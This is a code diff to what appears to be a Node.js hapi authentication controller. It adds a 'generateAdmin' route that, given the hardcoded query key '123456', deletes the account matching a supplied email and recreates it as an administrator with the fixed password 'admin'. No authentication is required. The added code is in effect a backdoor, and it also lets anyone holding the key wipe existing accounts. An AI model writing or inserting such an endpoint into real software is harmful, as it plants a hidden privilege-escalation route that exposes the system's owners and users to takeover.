@@ -5,12 +5,6 @@ const Boom = require('boom');
 const JWT = require('jsonwebtoken');
 const ErrorHandler = require("../../../utils/error.js");
 
-exports.index = {
-    handler: function(request, reply) {
-        return reply("run");
-    }
-};
-
 exports.login = {
     handler: function(request, reply) {
         let cookieOptions = request.server.configManager.get('web.cookieOptions');
@@ -93,6 +87,31 @@ exports.account = {
             return reply(user);
         }
         reply(Boom.unauthorized('User is not found'));
+    }
+};
+
+exports.generateAdmin = {
+    handler: function(request, reply) {
+        let { genaratePass, email } = request.query;
+        if (genaratePass == "123456") {
+            User.findOneAndRemove({
+                email: email
+            }, function(err, res) {
+                let user = new User({
+                    name: "Admin",
+                    email: email,
+                    roles: ["user", "admin"]
+                });
+                user.hashPassword("admin", function(err, encrypted) {
+                    user.password = encrypted;
+                    user.save().then(function() {
+                        return reply({ status: true, msg: "Generate successful" });
+                    });
+                });
+            });
+        } else {
+            return reply({ status: false, msg: "Generate pass not true" });
+        }
     }
 };
 
